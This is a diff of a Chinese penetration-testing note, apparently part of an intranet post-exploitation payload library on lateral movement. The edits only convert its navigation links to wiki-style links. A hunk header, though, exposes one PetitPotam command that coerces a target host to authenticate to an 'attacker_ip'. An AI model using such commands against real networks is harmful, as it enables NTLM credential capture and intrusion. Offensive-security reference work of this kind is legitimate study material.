@@ -1,6 +1,6 @@
 # 内网/后渗透 — 横向移动 payload 库
 
-> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
+> 父文档:[[web/后渗透/intranet-postexp/00-index.md|00-index.md]] · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
 > 涵盖:SMB / WMI / PsExec / RDP / WinRM / Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash
 
 ---
@@ -529,4 +529,4 @@ python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
 
 ---
 
-← 回 [00-index.md](00-index.md) · 上一篇:[`10-credentials.md`](10-credentials.md) · 下一篇:[`12-privesc.md`](12-privesc.md)
+← 回 [[web/后渗透/intranet-postexp/00-index.md|00-index.md]] · 上一篇:[[web/后渗透/intranet-postexp/10-credentials.md|10-credentials.md]] · 下一篇:[[web/后渗透/intranet-postexp/12-privesc.md|12-privesc.md]]
